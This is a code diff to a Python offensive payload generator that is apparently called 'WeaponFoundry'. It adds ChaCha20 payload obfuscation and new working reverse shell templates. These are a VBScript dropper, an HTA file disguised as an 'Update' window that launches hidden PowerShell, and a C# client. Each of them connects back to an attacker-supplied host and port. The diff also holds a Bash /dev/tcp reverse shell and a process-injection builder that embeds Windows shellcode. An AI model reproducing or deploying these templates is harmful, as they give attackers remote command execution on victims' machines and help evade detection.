@@ -112,6 +112,8 @@ class GeneratedPayload:
 # ENCRYPTION ENGINE
 # =============================================================================
 
+_PYCRYPTODOME_NOT_FOUND = "pycryptodome not found"
+
 
 class EncryptionEngine:
     """Multi-method encryption engine for payload obfuscation.
@@ -221,13 +223,51 @@ class EncryptionEngine:
             from Crypto.Cipher import AES  # nosec B413
         except ImportError as e:
             logger.exception("AES Decryption failed: Missing pycryptodome")
-            msg = "pycryptodome not found"
-            raise ImportError(msg) from e
+            raise ImportError(_PYCRYPTODOME_NOT_FOUND) from e
 
         key = hashlib.sha256(key).digest() if len(key) < 32 else key[:32]
 
         cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
         return cipher.decrypt_and_verify(data, tag)
+
+    @staticmethod
+    def chacha20_encrypt(data: bytes, key: bytes) -> tuple[bytes, bytes]:
+        """ChaCha20-Poly1305 encryption.
+
+        Returns:
+            Tuple of (tag + ciphertext, nonce)
+        """
+        try:
+            from Crypto.Cipher import ChaCha20_Poly1305  # nosec B413
+        except ImportError as e:
+            logger.exception("ChaCha20 Encryption failed: Missing pycryptodome")
+            raise ImportError(_PYCRYPTODOME_NOT_FOUND) from e
+
+        key = hashlib.sha256(key).digest() if len(key) < 32 else key[:32]
+        cipher = ChaCha20_Poly1305.new(key=key)
+        ciphertext, tag = cipher.encrypt_and_digest(data)
+        return tag + ciphertext, cipher.nonce
+
+    @staticmethod
+    def chacha20_decrypt(data: bytes, key: bytes, nonce: bytes) -> bytes:
+        """ChaCha20-Poly1305 decryption.
+
+        Args:
+            data: tag (16 bytes) + ciphertext
+            key: Encryption key
+            nonce: Nonce used for encryption
+        """
+        try:
+            from Crypto.Cipher import ChaCha20_Poly1305  # nosec B413
+        except ImportError as e:
+            logger.exception("ChaCha20 Decryption failed: Missing pycryptodome")
+            raise ImportError(_PYCRYPTODOME_NOT_FOUND) from e
+
+        key = hashlib.sha256(key).digest() if len(key) < 32 else key[:32]
+        tag = data[:16]
+        ciphertext = data[16:]
+        cipher = ChaCha20_Poly1305.new(key=key, nonce=nonce)
+        return cipher.decrypt_and_verify(ciphertext, tag)
 
     def encrypt(
         self,
@@ -268,6 +308,10 @@ class EncryptionEngine:
             encrypted, nonce, tag = self.aes_encrypt(data, key)
             # Prepend tag to encrypted data for simplicity in storage
             return tag + encrypted, key, nonce
+
+        if method == EncryptionMethod.CHACHA20:
+            encrypted, nonce = self.chacha20_encrypt(data, key)
+            return encrypted, key, nonce
 
         logger.warning("Unknown encryption method: %s", method)
         return data, b"", None
@@ -518,6 +562,71 @@ $c.Close()
     def get_reverse_shell_bash(lhost: str, lport: int) -> str:
         """Generate Bash reverse shell code."""
         return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
+
+    @staticmethod
+    def get_reverse_shell_vbs(lhost: str, lport: int) -> str:
+        """Generate VBScript reverse shell code."""
+        return f'''Set s=CreateObject("WScript.Shell")
+Set o=CreateObject("MSXML2.ServerXMLHTTP.6.0")
+Dim cmd
+cmd="cmd.exe /c powershell -nop -w hidden -c ""$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)}};$c.Close()"""
+s.Run cmd,0,False
+'''
+
+    @staticmethod
+    def get_reverse_shell_hta(lhost: str, lport: int) -> str:
+        """Generate HTA (HTML Application) reverse shell code."""
+        return f'''<html>
+<head><title>Update</title>
+<HTA:APPLICATION ID="app" APPLICATIONNAME="Update" BORDER="none" SHOWINTASKBAR="no" SINGLEINSTANCE="yes" WINDOWSTATE="minimize"/>
+</head>
+<body>
+<script language="VBScript">
+Set s=CreateObject("WScript.Shell")
+cmd="powershell -nop -w hidden -ep bypass -c ""$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)}};$c.Close()"""
+s.Run cmd,0,False
+window.close
+</script>
+</body>
+</html>'''
+
+    @staticmethod
+    def get_reverse_shell_csharp(lhost: str, lport: int) -> str:
+        """Generate C# reverse shell code."""
+        return f"""using System;
+using System.Net.Sockets;
+using System.Diagnostics;
+using System.IO;
+using System.Text;
+
+class P {{
+    static void Main() {{
+        using (TcpClient c = new TcpClient("{lhost}", {lport})) {{
+            using (NetworkStream s = c.GetStream()) {{
+                Process p = new Process();
+                p.StartInfo.FileName = "cmd.exe";
+                p.StartInfo.UseShellExecute = false;
+                p.StartInfo.RedirectStandardInput = true;
+                p.StartInfo.RedirectStandardOutput = true;
+                p.StartInfo.RedirectStandardError = true;
+                p.StartInfo.CreateNoWindow = true;
+                p.Start();
+                byte[] buf = new byte[65536];
+                int len;
+                while ((len = s.Read(buf, 0, buf.Length)) != 0) {{
+                    string cmd = Encoding.ASCII.GetString(buf, 0, len);
+                    p.StandardInput.WriteLine(cmd);
+                    p.StandardInput.Flush();
+                    System.Threading.Thread.Sleep(500);
+                    string output = p.StandardOutput.ReadToEnd();
+                    byte[] ob = Encoding.ASCII.GetBytes(output);
+                    s.Write(ob, 0, ob.Length);
+                }}
+                p.Kill();
+            }}
+        }}
+    }}
+}}"""
 
     @staticmethod
     def get_bind_shell_python(lport: int) -> str:
@@ -891,49 +1000,49 @@ class WeaponFoundry:
         format: PayloadFormat,
     ) -> str:
         """Generate base payload code."""
-        # 1. Basic Shells
         if shell_type == ShellType.REVERSE_TCP:
-            if format == PayloadFormat.PYTHON:
-                return self.templates.get_reverse_shell_python(lhost, lport)
-            if format == PayloadFormat.POWERSHELL:
-                return self.templates.get_reverse_shell_powershell(lhost, lport)
-            if format == PayloadFormat.BASH:
-                return self.templates.get_reverse_shell_bash(lhost, lport)
+            return self._get_reverse_tcp_payload(format, lhost, lport)
 
-        elif shell_type == ShellType.BIND_TCP and format == PayloadFormat.PYTHON:
+        if shell_type == ShellType.BIND_TCP and format == PayloadFormat.PYTHON:
             return self.templates.get_bind_shell_python(lport)
 
-        # 2. Advanced Injection (Process Injection)
-        elif shell_type == ShellType.PROCESS_INJECTION:
-            if format == PayloadFormat.PYTHON:
-                # For process injection, we need raw shellcode.
-                # Since we are in Python, we will embed the octal/hex of the shellcode.
-                # Get raw shellcode (Placeholder/Generated)
-                raw_shellcode = self.shellcode_gen.get_windows_x64_reverse_tcp(
-                    lhost,
-                    lport,
-                )
-
-                # In a real weaponization, we might use msfvenom output here.
-                # For now, we use a dummy variable name that the decoder/encryptor will wrap.
-                # However, the Injector expects a bytes variable.
-                # Our encryption engine produces a DECODER that executes 'exec()'.
-                # We need the decrypted payload to be the INJECTOR SCRIPT + SHELLCODE.
-
-                injector_code = self.templates.get_process_injector_python(
-                    shellcode_var="_sc",
-                )
-
-                # Logic: The final payload is:
-                # _sc = b"\x...\x..."
-                # <injector_code>
-
-                # We return the injector code. The variable definition must be prepended
-                # or handled. To keep it clean, we prepend a placeholder or the actual bytes.
-                sc_repr = str(raw_shellcode)  # This is b'' representation
-                return f"_sc={sc_repr}\n{injector_code}"
+        if shell_type == ShellType.PROCESS_INJECTION and format == PayloadFormat.PYTHON:
+            return self._get_process_injection_payload(lhost, lport)
 
         return self.templates.get_reverse_shell_python(lhost, lport)
+
+    def _get_reverse_tcp_payload(
+        self,
+        format: PayloadFormat,
+        lhost: str,
+        lport: int,
+    ) -> str:
+        """Return reverse TCP payload for the requested format."""
+        if format == PayloadFormat.PYTHON:
+            return self.templates.get_reverse_shell_python(lhost, lport)
+        if format == PayloadFormat.POWERSHELL:
+            return self.templates.get_reverse_shell_powershell(lhost, lport)
+        if format == PayloadFormat.BASH:
+            return self.templates.get_reverse_shell_bash(lhost, lport)
+        if format == PayloadFormat.VBS:
+            return self.templates.get_reverse_shell_vbs(lhost, lport)
+        if format == PayloadFormat.HTA:
+            return self.templates.get_reverse_shell_hta(lhost, lport)
+        if format == PayloadFormat.CSHARP:
+            return self.templates.get_reverse_shell_csharp(lhost, lport)
+        return self.templates.get_reverse_shell_python(lhost, lport)
+
+    def _get_process_injection_payload(self, lhost: str, lport: int) -> str:
+        """Build a process-injection payload with embedded shellcode."""
+        raw_shellcode = self.shellcode_gen.get_windows_x64_reverse_tcp(
+            lhost,
+            lport,
+        )
+        injector_code = self.templates.get_process_injector_python(
+            shellcode_var="_sc",
+        )
+        sc_repr = str(raw_shellcode)
+        return f"_sc={sc_repr}\n{injector_code}"
 
     def _add_anti_analysis(
         self,
